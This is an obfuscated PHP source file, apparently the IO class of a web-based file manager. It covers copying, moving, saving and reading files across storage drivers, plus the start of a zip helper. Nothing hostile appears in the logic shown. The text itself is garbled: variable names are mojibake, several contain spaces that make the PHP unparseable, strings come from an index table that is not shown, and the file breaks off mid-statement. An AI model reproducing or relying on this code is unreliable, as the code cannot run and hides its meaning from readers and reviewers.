<?php
 goto AÎÙ‚‹…ß«; dã¤ªêò°Ï: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¨ˆÎÉ‹ğ, $¼§ŒâÔÁ) { $¤ç½¬µ =& $_SERVER[Ã¶¡¶„æ]; $êäšƒÖ = $¼§ŒâÔÁ; $GLOBALS[$¤ç½¬µ[1160]] = $¤ç½¬µ[1161] . $¨ˆÎÉ‹ğ; Hook::trigger($¤ç½¬µ[1161] . $¨ˆÎÉ‹ğ . $¤ç½¬µ[1162], $êäšƒÖ); $Ùïúó¼ì = self::driverMake($¼§ŒâÔÁ[0]); if (!$Ùïúó¼ì) { return !1; } if (method_exists($Ùïúó¼ì, $¨ˆÎÉ‹ğ)) { $Â« í§õ = @call_user_func_array(array($Ùïúó¼ì, $¨ˆÎÉ‹ğ), $¼§ŒâÔÁ); } else { if (method_exists($Ùïúó¼ì, $¤ç½¬µ[1163])) { $Â« í§õ = @call_user_func_array(array($Ùïúó¼ì, $¨ˆÎÉ‹ğ), $¼§ŒâÔÁ); } else { if (method_exists(self, $¨ˆÎÉ‹ğ)) { $Â« í§õ = @call_user_func_array(array(self, $¨ˆÎÉ‹ğ), $¼§ŒâÔÁ); } else { $Â« í§õ = call_user_func_array(array(parent, $¨ˆÎÉ‹ğ), $¼§ŒâÔÁ); } } } Hook::trigger($¤ç½¬µ[1161] . $¨ˆÎÉ‹ğ . $¤ç½¬µ[1164], $êäšƒÖ, $Â« í§õ); return $Â« í§õ; } public static function init($Ã†¤ªº¼) { return self::driverMake($Ã†¤ªº¼); } public static function copy($ÌÖ´Ó±¸, $Ë©ŞÄìª, $ÇÙÃØ‚¼ = false, $•§ÏÁš = false) { return self::copyMoveStart($ÌÖ´Ó±¸, $Ë©ŞÄìª, $ÇÙÃØ‚¼, $_SERVER[Ã¶¡¶„æ][555], $•§ÏÁš); } public static function move($¢£ø…ßµ, $Â¸éà«‰, $Ğ¿°ÃÉí = false, $ÃŒç‡ş = false) { return self::copyMoveStart($¢£ø…ßµ, $Â¸éà«‰, $Ğ¿°ÃÉí, $_SERVER[Ã¶¡¶„æ][557], $ÃŒç‡ş); } private static function copyMoveStart($Ãó¿˜Øå, $×öŒûé¸, $ÃÆö¢¾³, $™öÃüãá, $¤Ùâú° ) { $Ããè×ŞÀ =& $_SERVER[Ã¶¡¶„æ]; $âï†æß = array($Ãó¿˜Øå, $×öŒûé¸, $ÃÆö¢¾³, $¤Ùâú° ); Hook::trigger($Ããè×ŞÀ[1161] . $™öÃüãá . $Ããè×ŞÀ[1162], $âï†æß); $ş°¹ñÆ‰ = self::copyMove($Ãó¿˜Øå, $×öŒûé¸, $ÃÆö¢¾³, $™öÃüãá, $¤Ùâú° ); Hook::trigger($Ããè×ŞÀ[1161] . $™öÃüãá . $Ããè×ŞÀ[1164], $âï†æß, $ş°¹ñÆ‰); return $ş°¹ñÆ‰; } public static function saveFile($»Î—¥Ïè, $¯¸È­, $€³ùÊØ = true) { $á®Ô»ßĞ =& $_SERVER[Ã¶¡¶„æ]; $È¥µ•Ãè = self::info($¯¸È­); $®œ¶½øš = self::driverMake($»Î—¥Ïè); $ß½Ü‚Ş = self::driverMake($¯¸È­); $ó°³¢ÏÁ = !1; if ($ß½Ü‚Ş->pathParse[$á®Ô»ßĞ[1165]]) { $ó°³¢ÏÁ = $ß½Ü‚Ş; $‚š„ù› = $ß½Ü‚Ş->pathParse[$á®Ô»ßĞ[1165]]; $ß½Ü‚Ş = self::driverMake($‚š„ù›); } if ($®œ¶½øš->pathParse[$á®Ô»ßĞ[1165]]) { $œª¬åÃË = $®œ¶½øš->pathParse[$á®Ô»ßĞ[1165]]; $®œ¶½øš = self::driverMake($œª¬åÃË); } $÷ŠŸè·Ì = $ß½Ü‚Ş->pathFather($¯¸È­); $³ æ¢Ê = !0; if (!$€³ùÊØ && self::driverIsSame($®œ¶½øš, $ß½Ü‚Ş)) { $³ æ¢Ê = !1; } $Á¿³áÂ» = self::copyFile($®œ¶½øš, $»Î—¥Ïè, $ß½Ü‚Ş, $÷ŠŸè·Ì, $È¥µ•Ãè[$á®Ô»ßĞ[32]], $³ æ¢Ê); if ($ó°³¢ÏÁ) { $Á¿³áÂ» = $ó°³¢ÏÁ->getPathOuter($Á¿³áÂ»); } return $Á¿³áÂ»; } private static function copyMove($˜ÇÉˆ†, $Î‡„µš˜, $…Æ”×Ä, $©ü‚Ÿ÷ê, $¹ÁüÇ–Î = false) { $¿ê ’öË =& $_SERVER[Ã¶¡¶„æ]; if (!$˜ÇÉˆ† || $˜ÇÉˆ† == $¿ê ’öË[8] || !$Î‡„µš˜) { return !1; } ignore_timeout(); $óÂ¿Îæå = self::driverMake($˜ÇÉˆ†); $ªÆ¤ Ë² = self::driverMake($Î‡„µš˜); $ùŒ©† = $©ü‚Ÿ÷ê == $¿ê ’öË[557]; $ÛÔ–¢ = !1; if ($ªÆ¤ Ë²->pathParse[$¿ê ’öË[1165]]) { $ÛÔ–¢ = $ªÆ¤ Ë²; $Î‡„µš˜ = $ªÆ¤ Ë²->pathParse[$¿ê ’öË[1165]]; $ªÆ¤ Ë² = self::driverMake($Î‡„µš˜); } if ($óÂ¿Îæå->pathParse[$¿ê ’öË[1165]]) { $˜ÇÉˆ† = $óÂ¿Îæå->pathParse[$¿ê ’öË[1165]]; $óÂ¿Îæå = self::driverMake($˜ÇÉˆ†); } self::check($óÂ¿Îæå, $˜ÇÉˆ†, $ªÆ¤ Ë², $Î‡„µš˜); Hook::trigger($¿ê ’öË[1166], $óÂ¿Îæå, $˜ÇÉˆ†, $ªÆ¤ Ë², $Î‡„µš˜); $×…½‰Ô = self::driverIsSame($óÂ¿Îæå, $ªÆ¤ Ë²); if ($×…½‰Ô) { if ($©ü‚Ÿ÷ê == $¿ê ’öË[557] && !method_exists($ªÆ¤ Ë², $¿ê ’öË[1167]) && trim($Î‡„µš˜, $¿ê ’öË[8]) == trim($ªÆ¤ Ë²->pathFather($˜ÇÉˆ†), $¿ê ’öË[8])) { if ($óÂ¿Îæå->pathThis($˜ÇÉˆ†) != $¹ÁüÇ–Î && !$óÂ¿Îæå->isTypeObject()) { return $óÂ¿Îæå->rename($˜ÇÉˆ†, $¹ÁüÇ–Î); } return $ªÆ¤ Ë²->getPathOuter($˜ÇÉˆ†); } if (method_exists($ªÆ¤ Ë², $©ü‚Ÿ÷ê)) { return $ªÆ¤ Ë²->{$©ü‚Ÿ÷ê}($˜ÇÉˆ†, $Î‡„µš˜, $…Æ”×Ä, $¹ÁüÇ–Î); } } if ($×…½‰Ô && $©ü‚Ÿ÷ê == $¿ê ’öË[557] && $ªÆ¤ Ë²->getType() == $¿ê ’öË[106]) { $£ïæõûª = $ªÆ¤ Ë²->movePath($˜ÇÉˆ†, $Î‡„µš˜, $¹ÁüÇ–Î); if ($£ïæõûª) { return $£ïæõûª; } } $˜‚¿äĞë = $óÂ¿Îæå->isFile($˜ÇÉˆ†); if (!$˜‚¿äĞë && $ªÆ¤ Ë²->getType() == $¿ê ’öË[764] && $óÂ¿Îæå->getType() == $¿ê ’öË[106]) { $£ïæõûª = $ªÆ¤ Ë²->copyFolderFromIO($óÂ¿Îæå, $˜ÇÉˆ†, $Î‡„µš˜, $…Æ”×Ä, $ùŒ©†, $¹ÁüÇ–Î); } else { $£ïæõûª = self::copyPath($óÂ¿Îæå, $˜ÇÉˆ†, $ªÆ¤ Ë², $Î‡„µš˜, $…Æ”×Ä, $ùŒ©†, $˜‚¿äĞë, $¹ÁüÇ–Î); } if ($£ïæõûª && $ùŒ©†) { $óÂ¿Îæå->remove($˜ÇÉˆ†); } if ($ÛÔ–¢) { $£ïæõûª = $ÛÔ–¢->getPathOuter($£ïæõûª); } return $£ïæõûª; } private static function check($ÒİÊâ³», $ô—ñÔçÒ, $­Óéç“ß, &$Ê‘ ÄÌ¤) { $¼ÚÁé‰½ =& $_SERVER[Ã¶¡¶„æ]; if (self::driverIsSame($ÒİÊâ³», $­Óéç“ß) && $ÒİÊâ³»->isFolder($ô—ñÔçÒ) && $ÒİÊâ³»->isParentOf($ô—ñÔçÒ, $Ê‘ ÄÌ¤)) { show_json(LNG($¼ÚÁé‰½[1168]), !1); } if (!$ÒİÊâ³»->exist($ô—ñÔçÒ)) { show_json(LNG($¼ÚÁé‰½[105]), !1); } } private static function copyPath($ÇÕĞëë, $ßÃíèÇŠ, $²—Šó²Ï, $“êı€…Ÿ, $¯´çõâ¸, $°æçüÜ, $»¼»Èƒß, $Ø —¬Êò = false, $Ğ‘Ã‡±¨ = true) { $È‡Ù®Áà =& $_SERVER[Ã¶¡¶„æ]; $¶üÆàœ‘ = empty($Ø —¬Êò) && $Ø —¬Êò !== $È‡Ù®Áà[197] ? $ÇÕĞëë->pathThis($ßÃíèÇŠ) : $Ø —¬Êò; if ($¯´çõâ¸) { $¹³Á½”³ = $²—Šó²Ï->fileNameExist($“êı€…Ÿ, $¶üÆàœ‘); $ÉÚıÖ·ì = $¶üÆàœ‘; $¶üÆàœ‘ = $²—Šó²Ï->fileNameAuto($“êı€…Ÿ, $¶üÆàœ‘, $¯´çõâ¸, !$»¼»Èƒß); if (!$¹³Á½”³ || $ÉÚıÖ·ì != $¶üÆàœ‘) { $¯´çõâ¸ = !1; } if ($Ğ‘Ã‡±¨ && !$¯´çõâ¸) { $²—Šó²Ï->_data[$È‡Ù®Áà[1169]] = !0; } } if ($»¼»Èƒß) { return self::copyFile($ÇÕĞëë, $ßÃíèÇŠ, $²—Šó²Ï, $“êı€…Ÿ, $¶üÆàœ‘, $°æçüÜ); } if ($¯´çõâ¸ == REPEAT_RENAME_FOLDER) { $¯´çõâ¸ = !1; } $«÷æÌË³ = rtrim($“êı€…Ÿ, $È‡Ù®Áà[8]) . $È‡Ù®Áà[8] . $¶üÆàœ‘; $†Õâà¼ = $²—Šó²Ï->mkdir($²—Šó²Ï->getPath($«÷æÌË³), $¯´çõâ¸); $“êı€…Ÿ = $²—Šó²Ï->getPathInner($†Õâà¼); $¤Ã± ·ê = $ÇÕĞëë->listPath($ßÃíèÇŠ, !0); $¤Ã± ·ê = is_array($¤Ã± ·ê) ? $¤Ã± ·ê : array($È‡Ù®Áà[83] => array(), $È‡Ù®Áà[82] => array()); $íŒí•™ = array_merge($¤Ã± ·ê[$È‡Ù®Áà[83]], $¤Ã± ·ê[$È‡Ù®Áà[82]]); foreach ($íŒí•™ as $÷ÂóÌÀÎ) { $‚¾ù…øÁ = $÷ÂóÌÀÎ[$È‡Ù®Áà[33]] == $È‡Ù®Áà[199]; $ßÃíèÇŠ = $ÇÕĞëë->getPathInner($÷ÂóÌÀÎ[$È‡Ù®Áà[84]]); $ÙØÃõ¼Ï = self::copyPath($ÇÕĞëë, $ßÃíèÇŠ, $²—Šó²Ï, $“êı€…Ÿ, $¯´çõâ¸, $°æçüÜ, $‚¾ù…øÁ, !1, !1); if (!$ÙØÃõ¼Ï) { IO::errorTips($È‡Ù®Áà[1170] . $ßÃíèÇŠ . $È‡Ù®Áà[70] . $“êı€…Ÿ); } } self::copyMoveKeepInfo($ÇÕĞëë, $ßÃíèÇŠ, $†Õâà¼); return $†Õâà¼; } private static function copyFile($¾¤Ò€“ó, $æÊ¥µ²ú, $î¡øñµ², $‚º§÷—õ, $ú¼£ççš, $ŒŒ‚œç) { $Ù×š´åÙ =& $_SERVER[Ã¶¡¶„æ]; $‚º§÷—õ = $î¡øñµ²->getPath(rtrim($‚º§÷—õ, $Ù×š´åÙ[8]) . $Ù×š´åÙ[8] . $ú¼£ççš); $ş´ÙˆìÊ = $Ù×š´åÙ[1171] . time() . rand_string(5); Hook::trigger($Ù×š´åÙ[1172], $¾¤Ò€“ó, $æÊ¥µ²ú, $î¡øñµ², $‚º§÷—õ, $ú¼£ççš, $ş´ÙˆìÊ); if (self::driverIsSame($¾¤Ò€“ó, $î¡øñµ²)) { if ($ŒŒ‚œç) { $óâ÷Çû„ = $î¡øñµ²->moveFile($æÊ¥µ²ú, $‚º§÷—õ); } else { $óâ÷Çû„ = $î¡øñµ²->copyFile($æÊ¥µ²ú, $‚º§÷—õ); } Hook::trigger($Ù×š´åÙ[1173], $¾¤Ò€“ó, $æÊ¥µ²ú, $î¡øñµ², $‚º§÷—õ, $ú¼£ççš, $óâ÷Çû„); self::copyMoveKeepInfo($¾¤Ò€“ó, $æÊ¥µ²ú, $óâ÷Çû„); return $óâ÷Çû„; } $¸¹âûØ½ = TEMP_FILES; if ($GLOBALS[$Ù×š´åÙ[6]][$Ù×š´åÙ[89]][$Ù×š´åÙ[802]]) { $¸¹âûØ½ = $GLOBALS[$Ù×š´åÙ[6]][$Ù×š´åÙ[89]][$Ù×š´åÙ[802]]; } $å«êâõ = $¸¹âûØ½; mk_dir($å«êâõ); $Æñ‘¨Çº = $å«êâõ . $ş´ÙˆìÊ; $íóªĞÂ = $Æñ‘¨Çº; $Æñ‘¨Çº = $¾¤Ò€“ó->download($æÊ¥µ²ú, $Æñ‘¨Çº); $Æñ‘¨Çº = $¾¤Ò€“ó->iconvApp($Æñ‘¨Çº); if (substr($Æñ‘¨Çº, strlen($¸¹âûØ½)) == $¸¹âûØ½) { $ŒŒ‚œç = !0; } $óâ÷Çû„ = $î¡øñµ²->upload($‚º§÷—õ, $Æñ‘¨Çº, $ŒŒ‚œç); self::remove($íóªĞÂ); Hook::trigger($Ù×š´åÙ[1173], $¾¤Ò€“ó, $æÊ¥µ²ú, $î¡øñµ², $‚º§÷—õ, $ú¼£ççš, $óâ÷Çû„); self::copyMoveKeepInfo($¾¤Ò€“ó, $æÊ¥µ²ú, $óâ÷Çû„); return $óâ÷Çû„; } private static function copyMoveKeepInfo($Ì÷ìïàĞ, $Ğ±ÔÉó£, $µ××ÎÖ) { if (!$µ××ÎÖ) { return; } $ ‰¿Ë—£ = $Ì÷ìïàĞ->info($Ğ±ÔÉó£); if (!is_array($ ‰¿Ë—£)) { return; } IO::setModifyTime($µ××ÎÖ, $ ‰¿Ë—£[$_SERVER[Ã¶¡¶„æ][85]]); } public static function pathFather($¶ïÜœ·È) { $Ö˜²Ãàİ = IO::init($¶ïÜœ·È); $ŞÔ¿Ü­“ = $Ö˜²Ãàİ->pathFather($Ö˜²Ãàİ->path); return $Ö˜²Ãàİ->getPathOuter($ŞÔ¿Ü­“); } public static function fileOut($Ößñ”Å, $œ ¡´—˜ = false, $åëÓßñ© = false, $¹î¢–½¦ = '') { $Ûƒ÷­®Û = self::driverMake($Ößñ”Å); if ($Ûƒ÷­®Û->isFileOutServer()) { return $Ûƒ÷­®Û->fileOutServer($Ößñ”Å, $œ ¡´—˜, $åëÓßñ©, $¹î¢–½¦); } return $Ûƒ÷­®Û->fileOut($Ößñ”Å, $œ ¡´—˜, $åëÓßñ©, $¹î¢–½¦); } public static function fileOutImage($ø¿Õ“ ±, $¾×ÖË¦¨ = 250) { $¬ª½û„„ = array(250, 600, 1200, 2000, 3000, 5000); for ($æœªû¦ = 0; $æœªû¦ < count($¬ª½û„„); $æœªû¦++) { if ($æœªû¦ == 0 && $¾×ÖË¦¨ <= $¬ª½û„„[$æœªû¦]) { $¾×ÖË¦¨ = $¬ª½û„„[$æœªû¦]; break; } else { if ($¾×ÖË¦¨ > $¬ª½û„„[$æœªû¦ - 1] && $¾×ÖË¦¨ <= $¬ª½û„„[$æœªû¦]) { $¾×ÖË¦¨ = $¬ª½û„„[$æœªû¦]; break; } else { if ($æœªû¦ == count($¬ª½û„„) - 1 && $¾×ÖË¦¨ > $¬ª½û„„[$æœªû¦]) { $¾×ÖË¦¨ = $¬ª½û„„[$æœªû¦]; break; } } } } $²¨‰¯Œ = self::driverMake($ø¿Õ“ ±); if ($²¨‰¯Œ->isFileOutServer()) { return $²¨‰¯Œ->fileOutImageServer($ø¿Õ“ ±, $¾×ÖË¦¨); } return $²¨‰¯Œ->fileOutImage($ø¿Õ“ ±, $¾×ÖË¦¨); } private static function driverIsSame($™¸”Ï», $şå¶íˆÊ) { $ñÃ¡Å¹¦ =& $_SERVER[Ã¶¡¶„æ]; $×ê§²š‹ = $™¸”Ï»->getType(); $ôÙ¶æë = $şå¶íˆÊ->getType(); if ($×ê§²š‹ != $ôÙ¶æë) { return !1; } if ($×ê§²š‹ == $ñÃ¡Å¹¦[764]) { return !0; } if ($×ê§²š‹ == $ñÃ¡Å¹¦[106]) { return !0; } if ($™¸”Ï»->pathDriver == $şå¶íˆÊ->pathDriver) { return !0; } return !1; } public static function copyUpdate($õÜ´êÉŒ, $œ¬Œ•— ) { $ô°Ÿ³è =& $_SERVER[Ã¶¡¶„æ]; if (!IO::exist($õÜ´êÉŒ)) { return !1; } if (!IO::exist($œ¬Œ•— )) { IO::mkdir($œ¬Œ•— ); } $´¹ÏÔ = self::_listAll($õÜ´êÉŒ); $ÛÍ¿Ø¶ñ = self::_listAll($œ¬Œ•— ); $Í›«Üòğ = array(); $ï¹›şæ = array(); foreach ($´¹ÏÔ as $»ÃªÍÑŞ => $ÂàÅüÕ™) { if (isset($ÛÍ¿Ø¶ñ[$»ÃªÍÑŞ])) { if ($ÂàÅüÕ™[$ô°Ÿ³è[75]] == 1) { continue; } if ($ÛÍ¿Ø¶ñ[$»ÃªÍÑŞ][$ô°Ÿ³è[76]] == $ÂàÅüÕ™[$ô°Ÿ³è[76]]) { continue; } } if ($ÂàÅüÕ™[$ô°Ÿ³è[75]] == 1) { $ï¹›şæ[] = $œ¬Œ•—  . $ô°Ÿ³è[8] . $»ÃªÍÑŞ; continue; } $­şª‘ôà = strstr(trim($»ÃªÍÑŞ, $ô°Ÿ³è[8]), $ô°Ÿ³è[8]) ? get_path_father($»ÃªÍÑŞ) : $ô°Ÿ³è[12]; $Í›«Üòğ[] = array($ô°Ÿ³è[1174] => $ÂàÅüÕ™[$ô°Ÿ³è[84]], $ô°Ÿ³è[1175] => rtrim($œ¬Œ•— , $ô°Ÿ³è[8]) . $ô°Ÿ³è[8] . $­şª‘ôà, $ô°Ÿ³è[1176] => $ÂàÅüÕ™); } $àÓç™š» = array($ô°Ÿ³è[199] => $Í›«Üòğ, $ô°Ÿ³è[75] => $ï¹›şæ); Hook::trigger($ô°Ÿ³è[1177], $õÜ´êÉŒ, $œ¬Œ•— , $àÓç™š»); foreach ($ï¹›şæ as $ÂàÅüÕ™) { IO::mkdir($ÂàÅüÕ™); } foreach ($Í›«Üòğ as $ÂàÅüÕ™) { IO::copy($ÂàÅüÕ™[$ô°Ÿ³è[1174]], $ÂàÅüÕ™[$ô°Ÿ³è[1175]], REPEAT_REPLACE); } } private static function _listAll($ëş¦Ä›‡) { $ú¯×º³¦ =& $_SERVER[Ã¶¡¶„æ]; $ëş¦Ä›‡ = KodIO::clear($ëş¦Ä›‡); $›éªÅ¼û = IO::listAll($ëş¦Ä›‡); foreach ($›éªÅ¼û as &$óÑ©ü÷­) { $ñ¾¼å¸ = substr($óÑ©ü÷­[$ú¯×º³¦[84]], strlen($ëş¦Ä›‡)); $óÑ©ü÷­[$ú¯×º³¦[1178]] = trim($ñ¾¼å¸, $ú¯×º³¦[8]); } unset($óÑ©ü÷­); return array_to_keyvalue($›éªÅ¼û, $ú¯×º³¦[1178]); } public static function fileSubstr($Ë¨‡£İ÷, $–« Ø„¶, $¿É†¬¦¥ = false) { $ùÖĞï¦ =& $_SERVER[Ã¶¡¶„æ]; $»«Û¦îÄ = self::driverMake($Ë¨‡£İ÷); $–”¨ØêÄ = $»«Û¦îÄ->size($Ë¨‡£İ÷); $³†ã”èâ = $–« Ø„¶; $¨Ò•ëã’ = $¿É†¬¦¥; if ($–« Ø„¶ < 0) { $–« Ø„¶ = $–”¨ØêÄ + $–« Ø„¶; } if ($¿É†¬¦¥ === !1) { $¿É†¬¦¥ = $–”¨ØêÄ - $–« Ø„¶; } if ($–« Ø„¶ + $¿É†¬¦¥ > $–”¨ØêÄ) { $¿É†¬¦¥ = $–”¨ØêÄ - $–« Ø„¶; } if (!$–”¨ØêÄ && $»«Û¦îÄ->getType() == $ùÖĞï¦[106] && !$»«Û¦îÄ->exist($Ë¨‡£İ÷)) { $¯®úªá¬ = get_path_this($Ë¨‡£İ÷); $²ıÊ„¤• = parse_url_query($¯®úªá¬); if (is_array($²ıÊ„¤•) && isset($²ıÊ„¤•[$ùÖĞï¦[32]])) { $¯®úªá¬ = urldecode($²ıÊ„¤•[$ùÖĞï¦[32]]); } throw new Exception($ùÖĞï¦[1179] . LNG($ùÖĞï¦[1180]) . $ùÖĞï¦[980] . clear_html($¯®úªá¬) . $ùÖĞï¦[12]); } if ($¿É†¬¦¥ <= 0) { return $ùÖĞï¦[12]; } if ($–« Ø„¶ < 0 || $–« Ø„¶ >= $–”¨ØêÄ || $¿É†¬¦¥ > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\x65\122\145\141\x64\x20\145\162\162\157\x72\x21\40\163\x74\x61\162\164\x3d{$–« Ø„¶}\x3b\154\x65\x6e\x67\164\150\75{$¿É†¬¦¥}\x3b\x20\163\x69\x7a\145\75{$–”¨ØêÄ}\73"); } $ĞñÒí¡À = $»«Û¦îÄ->fileSubstr($Ë¨‡£İ÷, $–« Ø„¶, $¿É†¬¦¥); if (!$ĞñÒí¡À && $¿É†¬¦¥ && isset($GLOBALS[$ùÖĞï¦[1181]])) { throw new Exception($GLOBALS[$ùÖĞï¦[1181]][$ùÖĞï¦[1182]]); } return $ĞñÒí¡À; } private static function driverMake(&$Åş£±ºÊ) { $ûÓ–¬¿’ =& $_SERVER[Ã¶¡¶„æ]; $»‰åõöå = KodIO::parse($Åş£±ºÊ); if (!self::$driverListSystem) { $Ö½Œ“®ü = Model($ûÓ–¬¿’[773])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Ö½Œ“®ü, $ûÓ–¬¿’[399]); } if ($»‰åõöå[$ûÓ–¬¿’[33]] == KodIO::KOD_IO && !self::$driverListSystem[$»‰åõöå[$ûÓ–¬¿’[399]]]) { return !1; } $Åş£±ºÊ = $»‰åõöå[$ûÓ–¬¿’[1183]]; $ı™Å¾ïÁ = self::driverGet($»‰åõöå, $Åş£±ºÊ); return $ı™Å¾ïÁ; } private static function driverGet($Ğ«¾ã…‚, &$ É‹‹–¶) { $Š°™Çƒ =& $_SERVER[Ã¶¡¶„æ]; $¬Ä“Ö¿ä = $Ğ«¾ã…‚[$Š°™Çƒ[1184]]; $‡“‰Ÿ´» = $Ğ«¾ã…‚[$Š°™Çƒ[399]]; switch ($Ğ«¾ã…‚[$Š°™Çƒ[33]]) { case KodIO::KOD_IO: $±¬›’ïÈ = self::$driverListSystem[$‡“‰Ÿ´»]; break; case KodIO::KOD_SOURCE: $ É‹‹–¶ = $‡“‰Ÿ´» . $ É‹‹–¶; $±¬›’ïÈ = array($Š°™Çƒ[1185] => $Š°™Çƒ[1186], $Š°™Çƒ[6] => $Ğ«¾ã…‚); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¼‰›ªÜ = $GLOBALS[$Š°™Çƒ[1187]]; self::$driverListUser = array_to_keyvalue($¼‰›ªÜ, $Š°™Çƒ[399]); } $±¬›’ïÈ = self::$driverListUser[$‡“‰Ÿ´»]; break; case KodIO::KOD_SHARE_LINK: $±¬›’ïÈ = array($Š°™Çƒ[1185] => $Š°™Çƒ[1188], $Š°™Çƒ[6] => $Ğ«¾ã…‚); $Ô·Ê˜Ûè = Action($Š°™Çƒ[1189])->sharePathInfo($Ğ«¾ã…‚[$Š°™Çƒ[84]]); $ É‹‹–¶ = $Ô·Ê˜Ûè[$Š°™Çƒ[402]]; if (!$Ô·Ê˜Ûè[$Š°™Çƒ[402]]) { $˜Ÿ¨ ‹î = Model($Š°™Çƒ[601])->getInfo($Ô·Ê˜Ûè[$Š°™Çƒ[489]]); $ É‹‹–¶ = KodIO::clear($˜Ÿ¨ ‹î[$Š°™Çƒ[1190]] . $Ğ«¾ã…‚[$Š°™Çƒ[1183]]); $Ğ«¾ã…‚[$Š°™Çƒ[487]] = $˜Ÿ¨ ‹î; $Ğ«¾ã…‚[$Š°™Çƒ[1165]] = $ É‹‹–¶; $±¬›’ïÈ = array($Š°™Çƒ[1185] => $Š°™Çƒ[1191], $Š°™Çƒ[6] => $Ğ«¾ã…‚); } break; case KodIO::KOD_SHARE_ITEM: $±¬›’ïÈ = array($Š°™Çƒ[1185] => $Š°™Çƒ[1192], $Š°™Çƒ[6] => $Ğ«¾ã…‚); $˜Ÿ¨ ‹î = Model($Š°™Çƒ[601])->getInfo($Ğ«¾ã…‚[$Š°™Çƒ[399]]); if ($˜Ÿ¨ ‹î[$Š°™Çƒ[402]] == $Š°™Çƒ[197]) { $ É‹‹–¶ = KodIO::clear($˜Ÿ¨ ‹î[$Š°™Çƒ[1190]] . $Ğ«¾ã…‚[$Š°™Çƒ[1183]]); $Ğ«¾ã…‚[$Š°™Çƒ[487]] = $˜Ÿ¨ ‹î; $Ğ«¾ã…‚[$Š°™Çƒ[1165]] = $ É‹‹–¶; $±¬›’ïÈ = array($Š°™Çƒ[1185] => $Š°™Çƒ[1193], $Š°™Çƒ[6] => $Ğ«¾ã…‚); } else { if (!$ É‹‹–¶) { $ É‹‹–¶ = $˜Ÿ¨ ‹î[$Š°™Çƒ[402]]; } } break; default: $ É‹‹–¶ = $Ğ«¾ã…‚[$Š°™Çƒ[84]]; $±¬›’ïÈ = array($Š°™Çƒ[1185] => $Š°™Çƒ[1194]); break; } $÷İÉ´Ù” = $Ğ«¾ã…‚[$Š°™Çƒ[84]]; if (!isset(self::$driverCache[$÷İÉ´Ù”])) { $Ùò—Ø‘ï = strtolower($±¬›’ïÈ[$Š°™Çƒ[95]]); $°ïå¿× = $GLOBALS[$Š°™Çƒ[6]][$Š°™Çƒ[89]][$Š°™Çƒ[832]]; $²¾Óô‚Õ = $Š°™Çƒ[74] . (isset($°ïå¿×[$Ùò—Ø‘ï]) ? $°ïå¿×[$Ùò—Ø‘ï] : ucfirst($Ùò—Ø‘ï)); if (!class_exists($²¾Óô‚Õ)) { show_json("{$²¾Óô‚Õ}\40\156\157\164\40\x65\x78\x69\163\164\x73\x21", !1); } $ê™Ç•û = isset($±¬›’ïÈ[$Š°™Çƒ[6]]) ? $±¬›’ïÈ[$Š°™Çƒ[6]] : !1; self::$driverCache[$÷İÉ´Ù”] = new $²¾Óô‚Õ($ê™Ç•û); } $ª€à×˜ = self::$driverCache[$÷İÉ´Ù”]; $ª€à×˜->pathDriver = $¬Ä“Ö¿ä; $ª€à×˜->pathBase = $Š°™Çƒ[12]; if (isset($±¬›’ïÈ[$Š°™Çƒ[6]][$Š°™Çƒ[1195]])) { $ª€à×˜->pathBase = rtrim($±¬›’ïÈ[$Š°™Çƒ[6]][$Š°™Çƒ[1195]], $Š°™Çƒ[8]) . $Š°™Çƒ[8]; $ É‹‹–¶ = $ª€à×˜->pathBase . ltrim($ É‹‹–¶, $Š°™Çƒ[8]); } $ É‹‹–¶ = $ª€à×˜->getPath($ É‹‹–¶); if (isset($Ğ«¾ã…‚[$Š°™Çƒ[1165]])) { $ É‹‹–¶ = $Ğ«¾ã…‚[$Š°™Çƒ[1165]]; } $ª€à×˜->path = $ É‹‹–¶; return $ª€à×˜; } public static function errorTips($¾ã…¬‘“ = false) { $ïßÓâ =& $_SERVER[Ã¶¡¶„æ]; static $€§èì¾ˆ = array(); $×Ñã× = 1000; if ($¾ã…¬‘“ === -1) { return $€§èì¾ˆ ? $€§èì¾ˆ[count($€§èì¾ˆ) - 1] : $ïßÓâ[12]; } if ($¾ã…¬‘“ === !1) { return implode($ïßÓâ[231], $€§èì¾ˆ); } if (count($€§èì¾ˆ) >= $×Ñã×) { $€§èì¾ˆ = array_slice($€§èì¾ˆ, $×Ñã× * 0.5, $×Ñã×); } $€§èì¾ˆ[] = $¾ã…¬‘“; write_log($ïßÓâ[162] . ACTION . $ïßÓâ[1196] . $¾ã…¬‘“, $ïßÓâ[1197]); } public static function getLastError($€Ğù¼Æ¸ = '') { $ÜÊË»¢ü = self::errorTips(-1); return $ÜÊË»¢ü ? $ÜÊË»¢ü : $€Ğù¼Æ¸; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $’ª›öëœ; if ($’ª›öëœ) { return $’ª›öëœ; } $Ê³€ÖÈ„ = IO::init($_SERVER[Ã¶¡¶„æ][8]); return $Ê³€ÖÈ„; } private static function iconvSystem($ ìñŠ) { return self::local()->iconvSystem($ ìñŠ); } private static function iconvApp($’ª—¾ª) { return self::local()->iconvApp($’ª—¾ª); } public static function zipFolder($õ…‹¶ÀÍ, $º«úéü¾ = "\172\151\x70", $ç÷ó§˜ó = '', $§ûŞ±‘Ï = REPEAT_RENAME) { $ ¬ªÂé =& $_SERVER[Ã¶¡¶„æ]; $á×Şß¹ = IO::listPath($õ…‹¶ÀÍ); if (!$á×Şß¹) { return !1; } $á×Şß¹ = array_merge($á×Şß¹[$ ¬ªÂé[82]], $á×Şß¹[$ ¬ªÂé[83]]); return self::zip($á×Şß¹, $º«úéü¾, $ç÷ó§˜ó, $§ûŞ±‘Ï); } public static function zip($¤œÜŒ«©, $××Ÿ¹œ£ = "\172\151\x70", $ò—Ù–½µ = '', $¿¿ÒÏ¯ï = REPEAT_RENAME) { $í„ª…¬© =& $_SERVER[Ã¶¡¶„æ]; if (is_string($¤œÜŒ«©) && $¤œÜŒ«©) { $¤œÜŒ«© = array(array($í„ª…¬©[84] => $¤œÜŒ«©)); } $Å·ÊØšû = self::init($¤œÜŒ«©[0][$í„ª…¬©[84]]); $Üíöóêƒ = self::info($¤œÜŒ«©[0][$í„ª…¬©[84]]); $•Šöñ¾Ü = $í„ª…¬©[12]; $À¼ìİ”­ = $í„ª…¬©[12]; $ı¯¥®»¬ = 